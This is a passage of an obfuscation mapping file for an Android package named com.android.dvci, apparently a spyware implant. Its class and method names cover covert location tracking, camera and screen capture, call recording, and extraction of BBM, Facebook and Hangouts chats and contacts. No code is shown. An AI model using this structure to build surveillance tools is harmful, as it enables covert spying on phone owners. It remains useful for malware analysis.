android.media.AmrInputStream -> android.media.AmrInputStream:
    97:116:void actualStart() -> M
    122:131:void locationWIFI() -> cI
    138:139:void locationGPS() -> cJ
    149:171:void locationCELL() -> cK
    177:207:void onLocationChanged(android.location.Location) -> onLocationChanged
    215:233:void onWifiScan(java.util.List) -> Code
    238:251:byte[] getAdditionalData(int,int) -> instance
    264:292:byte[] messageEvidence(byte[],int) -> sort
    300:346:byte[] getWifiPayload(java.lang.String,java.lang.String,int) -> Code
    356:393:byte[] getCellPayload(com.android.dvci.CellInfo,int) -> Code
    407:483:byte[] getGPSPayload(android.location.Location,long) -> Code
    490:518:void registerWifiScan(android.net.wifi.WifiManager) -> Code
    39:39:boolean access$002$7f2a33dd(com.android.dvci.module.ModulePosition) -> Code
com.android.dvci.module.ModulePosition$1 -> kso.aC:
    android.net.wifi.WifiManager val$wifiManager -> fJ
    com.android.dvci.module.ModulePosition this$0 -> fK
    505:514:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.module.ModuleSnapshot -> kso.aD:
    android.view.Display display -> fL
    java.lang.String cameraSound -> fM
    int quality -> quality
    java.util.concurrent.Semaphore working -> fN
    boolean frameBuffer -> fO
    boolean screenCap -> fP
    byte[] $ -> $
    84:107:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    126:166:void actualStart() -> M
    175:211:boolean screencapMethod() -> cL
    229:230:android.graphics.Bitmap readPng(com.android.dvci.file.AutoFile) -> instance
    238:370:boolean frameBufferMethod() -> cM
    375:380:boolean isBlack(byte[]) -> lua_then
    384:398:boolean isTablet() -> cN
    402:419:boolean usesInvertedColors() -> cO
    423:439:byte[] getAdditionalData() -> cF
    444:461:byte[] toJpeg(android.graphics.Bitmap) -> Code
    466:500:byte[] getRawBitmap() -> cP
    java.lang.String $$24d420ae(int) -> quicksort
com.android.dvci.module.NullModule -> kso.aE:
    16:16:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    24:24:void actualGo() -> L
    31:31:void actualStart() -> M
    38:38:void actualStop() -> N
com.android.dvci.module.ProcessObserver -> kso.aF:
    com.android.dvci.module.ModuleMic module$a50c108 -> fQ
    com.android.dvci.event.BaseEvent event -> fR
    22:25:int notification(com.android.dvci.ProcessInfo) -> Code
    7:7:int notification(java.lang.Object) -> Code
com.android.dvci.module.StandByObserver -> kso.aG:
    com.android.dvci.module.ModuleMic moduleMic -> fS
    16:16:int notification(com.android.dvci.Standby) -> Code
    6:6:int notification(java.lang.Object) -> Code
com.android.dvci.module.SubModule -> kso.aH:
    com.android.dvci.evidence.Markup markup -> proto_ids_size
    com.android.dvci.module.ModuleChat module$a50c108 -> fT
    boolean enabled -> enabled
    14:17:void init$4ddb0c1b(com.android.dvci.module.ModuleChat,com.android.dvci.evidence.Markup) -> Code
    void start() -> start
    40:40:int notification(com.android.dvci.ProcessInfo) -> Code
    44:44:void startListen() -> cQ
    47:47:void stopListen() -> cR
com.android.dvci.module.SubModuleManager -> kso.aI:
    com.android.dvci.module.ModuleChat module$a50c108 -> fT
    java.util.ArrayList submodules$7865b31 -> fU
    29:33:void add$62fcb526(com.android.dvci.module.chat.SubModuleChat) -> Code
    36:49:boolean start() -> cS
    53:65:boolean stop() -> cT
    69:72:boolean go() -> cU
    84:100:int notification(com.android.dvci.ProcessInfo) -> Code
com.android.dvci.module.call.CallInfo -> kso.aJ:
    int id -> id
    java.lang.String account -> fV
    java.lang.String peer -> fW
    java.lang.String displayName -> fX
    boolean incoming -> closefile
    boolean valid -> valid
    java.lang.String processName -> processName
    int programId -> fY
    java.util.Date timestamp -> cC
    boolean delay -> fZ
    boolean realRate -> ga
    long[] streamId -> gb
    java.util.Date begin -> gc
    java.util.Date end -> gd
    31:34:java.lang.String getCaller() -> cV
    38:41:java.lang.String getCallee() -> cW
    45:46:long getStreamId(boolean) -> openfile
    51:66:boolean setStreamId(boolean,long) -> Code
    71:85:boolean setStreamPid(int) -> globalize
    91:170:boolean update(boolean) -> closefile
com.android.dvci.module.call.Chunk -> kso.aK:
    java.lang.String encodedFile -> ge
    java.util.Date begin -> gc
    java.util.Date end -> gd
    boolean remote -> gf
    int channel -> gg
com.android.dvci.module.call.EncodingTask -> kso.aL:
    com.android.dvci.module.ModuleCall moduleCall -> gh
    java.lang.Object sync -> ev
    java.util.concurrent.LinkedBlockingQueue queue$19f590b5 -> gi
    boolean stopQueueMonitor -> gj
    32:36:void stop() -> stop
    39:47:void wake() -> cX
    52:97:void run() -> run
    13:13:int notification(java.lang.Object) -> Code
com.android.dvci.module.call.RecordCall -> kso.aM:
    com.android.dvci.module.call.RecordCall singleton -> gk
    java.lang.String currentRecordFile -> gl
    int strategy -> gm
    android.media.MediaRecorder recorder -> bV
    33:37:com.android.dvci.module.call.RecordCall self() -> cY
    197:220:boolean startRecord$2f10955c(int,java.lang.String) -> localclass
    224:235:boolean stopRecord() -> cZ
    239:288:boolean isSupported(com.android.dvci.module.ModuleCall) -> localvar
    292:353:boolean recordCall(com.android.dvci.module.ModuleCall,com.android.dvci.Call,boolean) -> Code
    22:22:java.lang.String access$000(com.android.dvci.module.call.RecordCall) -> Code
com.android.dvci.module.call.RecordCall$1 -> kso.aN:
    com.android.dvci.module.ModuleCall val$module -> gn
    com.android.dvci.Call val$call -> go
    boolean val$incoming -> gp
    com.android.dvci.module.call.RecordCall this$0 -> gq
    296:299:void run() -> run
com.android.dvci.module.camera.CameraSnapshot -> kso.aO:
    java.lang.Object cameraLock -> gr
    com.android.dvci.module.camera.CameraSnapshot singleton -> gs
    java.util.Hashtable enable -> gt
    com.android.dvci.module.camera.CameraSnapshot$1 autofocusCallback$5be0d91 -> gu
    com.android.dvci.module.camera.CameraSnapshot$2 errorCallback$589e2cd2 -> gv
    android.graphics.SurfaceTexture surface -> gw
    com.android.dvci.module.camera.CameraSnapshot$3 previewCallback$2a23b5ee -> gx
    104:107:com.android.dvci.module.camera.CameraSnapshot self() -> da
    209:259:void snapshot(int) -> main
    264:303:android.hardware.Camera openCamera(int) -> lua
    314:350:android.hardware.Camera prepareCamera$5b4daced(int) -> lua_main
    365:388:void choosePreviewSize$30a3c8c2(android.hardware.Camera$Parameters) -> Code
    437:454:android.hardware.Camera$Size getBestPreviewSize$3198ce76(android.hardware.Camera$Parameters) -> localvar
    459:467:boolean isBlack(byte[]) -> lua_then
    475:490:boolean releaseCamera(android.hardware.Camera) -> Code
    67:67:boolean access$000$3234f0de(byte[]) -> lua_true
    67:67:boolean access$100(com.android.dvci.module.camera.CameraSnapshot,android.hardware.Camera) -> Code
    67:67:java.lang.Object access$200(com.android.dvci.module.camera.CameraSnapshot) -> Code
com.android.dvci.module.camera.CameraSnapshot$1 -> kso.aP:
    com.android.dvci.module.camera.CameraSnapshot this$0 -> gy
    78:81:void onAutoFocus(boolean,android.hardware.Camera) -> onAutoFocus
com.android.dvci.module.camera.CameraSnapshot$2 -> kso.aQ:
    com.android.dvci.module.camera.CameraSnapshot this$0 -> gy
    90:90:void onError(int,android.hardware.Camera) -> onError
com.android.dvci.module.camera.CameraSnapshot$3 -> kso.aR:
    com.android.dvci.module.camera.CameraSnapshot this$0 -> gy
    167:191:void onPreviewFrame(byte[],android.hardware.Camera) -> onPreviewFrame
com.android.dvci.module.camera.CameraSnapshot$3$1CCD -> kso.aS:
    byte[] bytes -> gz
    android.hardware.Camera$Parameters cameraParms -> gA
    android.hardware.Camera$Size size -> gB
    com.android.dvci.module.camera.CameraSnapshot$3 this$1 -> gC
    138:161:void run() -> run
com.android.dvci.module.chat.ChatBBM -> kso.aT:
    int version -> version
    java.lang.String pObserving -> fi
    java.lang.String dbFileMaster -> gD
    java.lang.String dbFileGroup -> gE
    long lastBBM -> gF
    java.util.concurrent.Semaphore readChatSemaphore -> gG
    com.android.dvci.module.chat.ChatBBM$Account account -> gH
    boolean firstTime -> gI
    boolean started -> started
    byte[] $ -> $
    63:63:int getProgramId() -> db
    68:68:java.lang.String getObservingProgram() -> dc
    76:77:void notifyStopProgram(java.lang.String) -> file_size
    84:120:void updateHistory() -> dd
    130:170:void start() -> start
    176:186:int getBBMVersion(com.android.dvci.db.GenericSqliteHelper) -> Code
    190:203:long readBBMChatHistory(com.android.dvci.db.GenericSqliteHelper) -> localvar
    207:220:long readBBMGroupHistory() -> de
    227:312:long readBBMConversationHistory(com.android.dvci.db.GenericSqliteHelper) -> localclass
    317:338:void readAddressContacts(com.android.dvci.db.GenericSqliteHelper) -> instance
    342:358:void readAddressContactsUserPins(com.android.dvci.db.GenericSqliteHelper) -> inst
    362:377:void readAddressContactsUsers(com.android.dvci.db.GenericSqliteHelper) -> variables
    381:397:void readLocalContact(com.android.dvci.db.GenericSqliteHelper) -> mylist
    25:25:com.android.dvci.module.chat.ChatBBM$Account access$000(com.android.dvci.module.chat.ChatBBM) -> Code
    java.lang.String $(int,int,int) -> $
com.android.dvci.module.chat.ChatBBM$1 -> kso.aU:
    int[] val$type -> gJ
    com.android.dvci.module.chat.ChatBBM this$0 -> gK
    180:181:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$2 -> kso.aV:
    com.android.dvci.module.chat.ChatGroups val$groups -> gL
    java.lang.String val$me_number -> gM
    java.lang.String val$me_name -> gN
    java.util.ArrayList val$messages -> gO
    com.android.dvci.module.chat.ChatBBM this$0 -> gK
    265:292:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$3 -> kso.aW:
    com.android.dvci.module.chat.ChatBBM this$0 -> gK
    346:353:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$4 -> kso.aX:
    com.android.dvci.module.chat.ChatBBM this$0 -> gK
    365:372:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$5 -> kso.aY:
    com.android.dvci.module.chat.ChatBBM this$0 -> gK
    388:391:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$Account -> kso.aT$Code:
    int id -> id
    java.lang.String displayName -> fX
    java.lang.String pin -> pin
    com.android.dvci.module.chat.ChatBBM this$0 -> gK
    39:39:java.lang.String getName() -> getName
com.android.dvci.module.chat.ChatFacebook -> kso.aZ:
    java.lang.String pObserving -> fi
    java.util.Hashtable lastFb -> gP
    java.util.concurrent.Semaphore readChatSemaphore -> gG
    java.lang.String account_uid -> gQ
    java.lang.String account_name -> gR
    java.lang.String dirKatana -> gS
    java.lang.String dirOrca -> gT
    java.util.Hashtable contacts -> gU
    53:53:int getProgramId() -> db
    58:58:java.lang.String getObservingProgram() -> dc
    63:67:void notifyStopProgram(java.lang.String) -> file_size
    71:79:void start() -> start
    85:90:boolean fetchFb(java.lang.String) -> header_size
    102:146:boolean readMyAccount(java.lang.String) -> endian_tag
    152:219:void readFbMessageHistory(java.lang.String) -> link_size
    224:242:void readFB(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> Code
    245:312:long fetchMessages(java.lang.String,com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.FbConversation,long) -> Code
    320:333:void updateMarkupFb$44be42cf(java.lang.String,long) -> Code
    336:337:void saveEvidence(java.util.ArrayList) -> inst
    340:382:java.util.ArrayList getFbConversations$158fbcc4(java.lang.String,com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> Code
    389:399:void readAddressUser(java.lang.String) -> link_off
    405:426:void readAddressContacts(java.lang.String) -> map_off
    429:441:com.android.dvci.module.chat.Contact json2Contact(java.lang.String) -> string_ids_size
    445:466:com.android.dvci.module.chat.Contact[] json2Contacts(java.lang.String) -> string_ids_off
    29:29:com.android.dvci.module.chat.Contact[] access$000$353d64d4(java.lang.String) -> type_ids_size
com.android.dvci.module.chat.ChatFacebook$1 -> kso.ba:
    com.android.dvci.module.chat.FbConversation val$conv -> gV
    java.util.ArrayList val$messages -> gO
    com.android.dvci.module.chat.ChatFacebook this$0 -> gW
    256:301:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatFacebook$2 -> kso.bb:
    java.lang.String val$account -> gX
    java.util.ArrayList val$conversations$7865b31 -> gY
    com.android.dvci.module.chat.ChatFacebook this$0 -> gW
    357:377:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatGoogle -> kso.bc:
    java.lang.String pObserving -> fi
    java.util.concurrent.Semaphore readBabelSemaphore -> gZ
    byte[] $ -> $
    42:42:int getProgramId() -> db
    47:47:java.lang.String getObservingProgram() -> dc
    55:56:void notifyStopProgram(java.lang.String) -> file_size
    68:69:void start() -> start
    73:96:void readChatMessages() -> df
    104:110:void serializeMarkup(long[]) -> Code
    114:157:boolean readHangoutMessages(long[],java.lang.String,java.lang.String) -> Code
    161:239:long fetchHangoutMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.HangoutConversation,com.android.dvci.module.chat.ChatGroups,long) -> Code
    243:244:void saveEvidence(java.util.ArrayList) -> inst
    251:280:void fetchHangoutParticipants$73088b9f(com.android.dvci.db.GenericSqliteHelper,java.lang.String,com.android.dvci.module.chat.ChatGroups) -> Code
    283:308:java.util.ArrayList getHangoutConversations$1d05bf10(com.android.dvci.db.GenericSqliteHelper,java.lang.String,long) -> Code
    313:345:java.lang.String readAccount(java.lang.String) -> type_ids_off
    355:386:void readGoogleTalkMessages(long[]) -> localvar
    389:442:long fetchGTalkMessages(com.android.dvci.db.GenericSqliteHelper,long) -> Code
    446:467:void setMyAccount(com.android.dvci.db.GenericSqliteHelper) -> myarray
    470:500:void saveContacts(com.android.dvci.db.GenericSqliteHelper) -> invoked
    java.lang.String $$24d420ae(int) -> quicksort
com.android.dvci.module.chat.ChatGoogle$1 -> kso.bd:
    com.android.dvci.module.chat.HangoutConversation val$conversation -> ha
    com.android.dvci.module.chat.ChatGroups val$groups -> gL
    java.util.ArrayList val$messages -> gO
    com.android.dvci.module.chat.ChatGoogle this$0 -> hb
